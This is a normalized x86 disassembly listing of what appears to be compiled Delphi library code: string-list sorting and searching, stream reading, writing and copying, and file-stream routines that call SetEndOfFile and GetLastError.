mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_416958
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41855c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d8a
mov eax [ ebp - 0x4 ]
call sub_414598
retn
sub_414db4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b80
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414dff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e06
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_414e0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414e59
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e60
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_414e6c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405664
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_414ea0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414ee3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4041d8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414eea
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_414ef0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414fa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor edx edx
push ebp
push sub_414f87
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f8e
mov eax [ ebp - 0x4 ]
call sub_414598
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040d0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_414fb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41502a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_419108
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_419110
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415031
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4191b0
inc esi
dec ebx
jne r-xdata
sub_41505c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_415078
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414314
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a68
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4150e0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414690
jmp r-xdata
sub_41517c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a68
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4151bc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414690
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b54
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_415228
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414690
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414690
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_415284
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415284
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_4152a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415320
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414690
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_404034
pop edi
pop esi
pop ebx
retn
sub_41535c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414690
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_415384
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_4153b8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414958
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_415404
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414690
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414690
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415458
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_415384
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_404034
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_4154d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414690
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414690
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_404034
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41552c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414690
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41556c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415284
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41556c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41561c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415678
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41556c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4156cc
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415700
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415764
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_4157b8
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
mov esp ebp
pop ebp
retn
sub_415804
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031d8
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_4157b8
pop ecx
mov eax [ ebx ]
call sub_40321c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_4157b8
pop ecx
sub_415888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_4158f8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
sub_415930
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
sub_415968
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_4156ec
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415a44
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a4b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_4158f8
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415930
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_415a5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_415aac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418114
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ab3
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_415abc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_415b18
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408358
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_415b58
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c93c
pop ebx
pop ebp
retn 0x8
sub_415b80
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415bc4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_415bc4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_415ced
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4035b4
movzx edx di
mov eax esi
call sub_40827c
mov ecx eax
xor edx edx
mov eax ebx
call sub_415abc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4082f8
mov ecx eax
xor edx edx
mov eax ebx
call sub_415abc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415cf4
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_404004
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408498
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ac88
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408498
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ac88
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
jmp r-xdata
sub_415cf4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_415d18
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
call sub_408390
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_415d54
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415d8c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_415db0
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_415ddc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_415df4
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_4156ec
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_4158f8
sub_415e2c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_415d4c
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_415e54
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_415e2c
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
